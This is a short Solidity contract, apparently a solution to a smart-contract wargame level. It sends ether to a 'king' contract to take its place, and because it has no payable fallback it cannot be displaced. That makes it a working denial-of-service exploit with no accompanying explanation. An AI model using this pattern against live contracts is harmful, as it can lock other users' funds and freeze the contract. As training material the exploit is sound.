pragma solidity ^0.4.18;

contract KingKiller {
  address private _king;

  function KingKiller(address king) public payable {
    _king = king;
    require(address(_king).call.value(msg.value).gas(100000)());
  }

  function kill() public {
    selfdestruct(_king);
  }
}
